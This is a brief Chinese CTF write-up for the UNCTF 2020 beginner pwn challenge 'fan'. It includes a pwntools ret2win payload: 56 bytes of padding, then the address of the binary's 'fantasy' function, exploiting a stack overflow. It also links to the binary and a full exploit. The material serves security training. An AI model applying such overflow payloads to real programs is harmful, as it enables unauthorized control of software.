
## fan
- 题目描述
- 题目附件：[fan](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/unctf2020/pwn/fan/fan)
- 考察点：栈溢出
- 难度：入门

### 程序分析
ret2win

### 解题思路
``` python
offset = 56
payload = 'A'*offset
payload += p64(elf.sym['fantasy'])

sl(payload)
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/unctf2020/pwn/fan) 

